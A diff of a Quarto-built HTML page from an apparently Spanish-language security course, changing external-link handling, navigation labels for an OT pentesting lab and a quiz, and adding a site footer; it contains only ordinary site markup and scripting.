+        var filterRegex = new RegExp('/' + window.location.host + '/');
       var isInternal = (href) => {
           return filterRegex.test(href) || localhostRegex.test(href) || mailtoRegex.test(href);
       }
@@ -1616,6 +1800,13 @@ document.addEventListener('DOMContentLoaded', function() {
           if (link.dataset.originalHref !== undefined) {
             link.href = link.dataset.originalHref;
           }
+            // target, if specified
+            link.setAttribute("target", "_blank");
+            if (link.getAttribute("rel") === null) {
+              link.setAttribute("rel", "noopener");
+            }
+            // default icon
+            link.classList.add("external");
         }
       }
     function tippyHover(el, contentFn, onTriggerFn, onUntriggerFn) {
@@ -1932,12 +2123,12 @@ document.addEventListener('DOMContentLoaded', function() {
 <nav class="page-navigation">
   <div class="nav-page nav-page-previous">
       <a href="../labs/lab-unidad7.html" class="pagination-link" aria-label="Lab 7: Hardening y Pentesting de Sistemas OT">
-        <i class="bi bi-arrow-left-short"></i> <span class="nav-page-text"><span class="chapter-number">16</span>&nbsp; <span class="chapter-title">Lab 7: Hardening y Pentesting de Sistemas OT</span></span>
+        <i class="bi bi-arrow-left-short"></i> <span class="nav-page-text"><span class="chapter-title">Lab 7: Hardening y Pentesting de Sistemas OT</span></span>
       </a>          
   </div>
   <div class="nav-page nav-page-next">
       <a href="../quizzes/unidad1.html" class="pagination-link" aria-label="Quiz Unidad 1: Fundamentos y Reconocimiento Agéntico">
-        <span class="nav-page-text"><span class="chapter-number">18</span>&nbsp; <span class="chapter-title">Quiz Unidad 1: Fundamentos y Reconocimiento Agéntico</span></span> <i class="bi bi-arrow-right-short"></i>
+        <span class="nav-page-text"><span class="chapter-title">Quiz Unidad 1: Fundamentos y Reconocimiento Agéntico</span></span> <i class="bi bi-arrow-right-short"></i>
       </a>
   </div>
 </nav><div class="modal fade" id="quarto-embedded-source-code-modal" tabindex="-1" aria-labelledby="quarto-embedded-source-code-modal-label" aria-hidden="true"><div class="modal-dialog modal-dialog-scrollable"><div class="modal-content"><div class="modal-header"><h5 class="modal-title" id="quarto-embedded-source-code-modal-label">Source Code</h5><button class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><div class="">
@@ -2940,6 +3131,30 @@ document.addEventListener('DOMContentLoaded', function() {
 <span id="cb43-997"><a href="#cb43-997" aria-hidden="true" tabindex="-1"></a><span class="ss">- </span><span class="co">[</span><span class="ot">OffSec PEN-103 (Kali Linux Revealed)</span><span class="co">](https://www.kali.org/docs/)</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button" data-in-quarto-modal=""><i class="bi"></i></button></div>
 </div></div></div></div></div>
 </div> <!-- /content -->
+<footer class="footer">
+  <div class="nav-footer">
+    <div class="nav-footer-left">
+      &nbsp;
+    </div>   
+    <div class="nav-footer-center">
+      <ul class="footer-items list-unstyled">
+    <li class="nav-item">
+    <a class="nav-link active" href="../about.html" aria-current="page">
+<p>About</p>
+</a>
+  </li>  
+    <li class="nav-item">
+    <a class="nav-link" href="../license.html">
+<p>License</p>
+</a>
+  </li>  
+</ul>
+    </div>
+    <div class="nav-footer-right">
+      &nbsp;
+    </div>
+  </div>
+</footer>
 
 
 
